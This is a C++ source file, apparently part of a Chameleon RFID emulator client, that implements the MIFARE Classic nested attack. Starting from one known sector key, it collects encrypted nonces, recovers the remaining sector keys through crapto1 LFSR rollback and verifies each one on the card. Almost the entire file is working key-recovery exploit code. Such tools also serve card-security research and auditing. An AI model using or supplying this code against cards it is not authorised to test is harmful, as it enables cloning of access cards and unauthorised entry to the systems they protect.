#include "MfcNestedRecovery.h"
#include <cstdlib>
#include <cstring>
#include <cstdio>
#include "utils/ble/ChameleonClient.h"
extern "C" {
#include "utils/crypto/crapto1.h"
}
namespace MfcNestedRecovery { namespace {
constexpr uint32_t kMaxRecoveryCandidates=100000; constexpr int kCollectNr=3;
uint8_t trailerBlock(uint8_t s){return s<32?s*4+3:128+(s-32)*16+15;}
uint8_t par8(uint8_t b){b^=b>>4;b^=b>>2;b^=b>>1;return (~b)&1;}
uint8_t isNonce(uint32_t Nt,uint32_t NtEnc,uint32_t Ks1,const uint8_t*p){return (uint8_t)(par8((Nt>>24)&0xff)==(p[0]^par8((NtEnc>>24)&0xff)^BIT(Ks1,16)))&(uint8_t)(par8((Nt>>16)&0xff)==(p[1]^par8((NtEnc>>16)&0xff)^BIT(Ks1,8)))&(uint8_t)(par8((Nt>>8)&0xff)==(p[2]^par8((NtEnc>>8)&0xff)^BIT(Ks1,0)));}
void emit(LogFn fn,void*ctx,const char*m,LogLevel l){if(fn)fn(m,l,ctx);} struct Sample{uint32_t nt1,encNt2;uint8_t par[3];};
}
Result run(uint8_t sectors,const uint8_t uid[7],uint8_t uidLen,const bool foundA[40],const bool foundB[40],const uint8_t keysA[40][6],const uint8_t keysB[40][6],LogFn log,ProgressFn progress,void*ctx){
 Result r;memcpy(r.foundA,foundA,sizeof(r.foundA));memcpy(r.foundB,foundB,sizeof(r.foundB));memcpy(r.keysA,keysA,sizeof(r.keysA));memcpy(r.keysB,keysB,sizeof(r.keysB));if(sectors>40)sectors=40;auto&c=ChameleonClient::get();char m[96];
 int knownSec=-1;uint8_t knownKType=0;uint64_t knownKey64=0;for(uint8_t s=0;s<sectors&&knownSec<0;s++){if(r.foundA[s]){knownSec=s;knownKType=0x60;for(int i=0;i<6;i++)knownKey64=(knownKey64<<8)|r.keysA[s][i];}else if(r.foundB[s]){knownSec=s;knownKType=0x61;for(int i=0;i<6;i++)knownKey64=(knownKey64<<8)|r.keysB[s][i];}}
 if(knownSec<0){emit(log,ctx,"No known key to exploit",LogLevel::Error);return r;}emit(log,ctx,"Known key selected",LogLevel::Info);
 r.started=true; uint8_t ntLevel=0;if(c.mf1NTLevel(&ntLevel)){
  if(ntLevel==1) emit(log,ctx,"Static nonce detected; use Static Nested",LogLevel::Warning);
  else if(ntLevel==2) emit(log,ctx,"Compatible nonce detected",LogLevel::Success);
  else if(ntLevel==3) emit(log,ctx,"Hardened nonce detected",LogLevel::Warning);
  else emit(log,ctx,"Nonce type not recognized",LogLevel::Warning);
 }
 uint32_t uid32=0;for(int i=0;i<4&&i<(int)uidLen;i++)uid32=(uid32<<8)|uid[i];snprintf(m,sizeof(m),"uid32 = %08lX",(unsigned long)uid32);emit(log,ctx,m,LogLevel::Debug);uint8_t exploitBlock=trailerBlock((uint8_t)knownSec),knownKeyBytes[6];{uint64_t t=knownKey64;for(int i=5;i>=0;i--){knownKeyBytes[i]=(uint8_t)(t&0xff);t>>=8;}}
 int totalTargets=0;for(uint8_t s=0;s<sectors;s++)for(int kt=0;kt<2;kt++)if(!((kt==0)?r.foundA[s]:r.foundB[s]))totalTargets++;int done=0;
 for(uint8_t targetSec=0;targetSec<sectors;targetSec++)for(int kt=0;kt<2;kt++){uint8_t tKType=kt==0?0x60:0x61;char tkc=kt==0?'A':'B';uint8_t tBlock=trailerBlock(targetSec);if((kt==0)?r.foundA[targetSec]:r.foundB[targetSec]){done++;continue;}if((int)targetSec==knownSec&&tKType==knownKType){done++;continue;}
  Sample samples[kCollectNr];int collected=0;for(int attempt=0;attempt<4&&collected<kCollectNr;attempt++){ChameleonClient::NestedSample fw[8];int got=0;if(!c.mf1NestedAcquire(knownKType,exploitBlock,knownKeyBytes,tKType,tBlock,fw,8,&got)||got==0)continue;for(int i=0;i<got&&collected<kCollectNr;i++){samples[collected].nt1=fw[i].nt;samples[collected].encNt2=fw[i].ntEnc;samples[collected].par[0]=(fw[i].par>>3)&1;samples[collected].par[1]=(fw[i].par>>2)&1;samples[collected].par[2]=(fw[i].par>>1)&1;collected++;}if(progress){snprintf(m,sizeof(m),"Collecting samples (%d/%d)...",collected,kCollectNr);int pct=totalTargets?(done*100)/totalTargets+(collected*100)/(kCollectNr*totalTargets):0;if(pct>100)pct=100;progress(m,pct,ctx);}}
  if(collected==0){snprintf(m,sizeof(m),"S%d %c: no samples after %d attempts",targetSec,tkc,4);emit(log,ctx,m,LogLevel::Debug);snprintf(m,sizeof(m),"Sector %d Key %c: collection failed",targetSec,tkc);emit(log,ctx,m,LogLevel::Error);done++;continue;}
  bool found=false;int matches=0,recoveries=0,recNull=0;uint32_t firstMatchD=0xffffffffu,winningD=0,lastTick=0;
  for(uint32_t d=0;d<65535&&!found;d++){if((d-lastTick)>=8000){lastTick=d;if(progress){snprintf(m,sizeof(m),"Recovering keys (%d/%d)...",done+1,totalTargets);progress(m,totalTargets?(done*100)/totalTargets:0,ctx);}}uint32_t nt20=prng_successor(samples[0].nt1,d),ks10=samples[0].encNt2^nt20;if(!isNonce(nt20,samples[0].encNt2,ks10,samples[0].par))continue;bool all=true;for(int i=1;i<collected&&all;i++){uint32_t nt2=prng_successor(samples[i].nt1,d),ks1=samples[i].encNt2^nt2;if(!isNonce(nt2,samples[i].encNt2,ks1,samples[i].par))all=false;}if(!all)continue;matches++;if(firstMatchD==0xffffffffu)firstMatchD=d;Crypto1State*rev=lfsr_recovery32(ks10,nt20^uid32);if(!rev){recNull++;continue;}recoveries++;Crypto1State*rs=rev;int checked=0;while((rs->odd!=0||rs->even!=0)&&!found){lfsr_rollback_word(rs,nt20^uid32,0);uint64_t cand;crypto1_get_lfsr(rs,&cand);bool soft=true;for(int i=1;i<collected&&soft;i++){uint32_t nt2=prng_successor(samples[i].nt1,d);Crypto1State*test=crypto1_create(cand);crypto1_word(test,uid32^nt2,0);uint32_t testKs=crypto1_word(test,0,0);crypto1_destroy(test);if((samples[i].encNt2^nt2)!=testKs)soft=false;}if(soft){uint8_t b[6];uint64_t t=cand;for(int i=5;i>=0;i--){b[i]=(uint8_t)(t&0xff);t>>=8;}if(c.mf1CheckKey(tBlock,tKType,b)){if(kt==0){memcpy(r.keysA[targetSec],b,6);r.foundA[targetSec]=true;}else{memcpy(r.keysB[targetSec],b,6);r.foundB[targetSec]=true;}r.recovered++;found=true;winningD=d;}}rs++;if(++checked>kMaxRecoveryCandidates)break;}free(rev);}
  if(found){uint8_t*k=kt==0?r.keysA[targetSec]:r.keysB[targetSec];snprintf(m,sizeof(m),"S%d %c: KEY %02X%02X%02X%02X%02X%02X (d=%lu m=%d r=%d)",targetSec,tkc,k[0],k[1],k[2],k[3],k[4],k[5],(unsigned long)winningD,matches,recoveries);emit(log,ctx,m,LogLevel::Debug);snprintf(m,sizeof(m),"Sector %d Key %c recovered",targetSec,tkc);emit(log,ctx,m,LogLevel::Success);}else{snprintf(m,sizeof(m),"S%d %c: no key (col=%d m=%d r=%d null=%d firstD=%lu)",targetSec,tkc,collected,matches,recoveries,recNull,firstMatchD==0xffffffffu?0UL:(unsigned long)firstMatchD);emit(log,ctx,m,LogLevel::Debug);snprintf(m,sizeof(m),"Sector %d Key %c not recovered",targetSec,tkc);emit(log,ctx,m,LogLevel::Error);}done++;
 }
 r.success=r.recovered>0;return r;
}
}
